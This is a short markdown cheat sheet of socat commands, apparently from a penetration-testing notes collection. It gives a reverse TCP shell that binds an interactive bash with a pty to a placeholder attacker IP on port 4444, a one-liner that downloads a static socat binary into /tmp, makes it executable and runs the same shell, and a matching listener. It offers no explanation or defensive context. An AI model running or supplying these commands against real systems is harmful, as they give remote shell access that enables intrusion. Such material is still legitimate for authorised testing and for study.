# Socat

## Reverse TCP

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xx.x.x.x:4444

## Reverse TCP ( Download and execute )

wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xx.x.x.x:4444

## Listener

socat file:`tty`,raw,echo=0 tcp-listen:4444

